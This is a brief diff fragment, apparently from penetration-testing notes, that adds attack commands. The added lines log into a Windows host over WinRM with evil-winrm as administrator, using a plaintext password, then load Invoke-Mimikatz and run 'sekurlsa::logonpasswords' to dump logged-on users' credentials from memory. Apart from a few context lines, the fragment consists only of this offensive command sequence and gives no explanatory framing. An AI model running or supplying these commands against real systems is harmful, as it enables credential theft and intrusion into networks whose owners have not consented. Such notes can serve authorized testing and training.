@@ -28,3 +28,7 @@ Enter-PSSession -ComputerName 10.0.0.201 -Authentication Negotiate-Credential $c
 
 
 evil-winrm.rb -u administrator -p pass -i 10.4.23.208
+evil-winrm.rb -u administrator -p rocknroll_123321 -i 10.4.23.208 -s /root/Desktop/tools/scripts
+Invoke-Mimikatz.ps1
+menu
+Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'
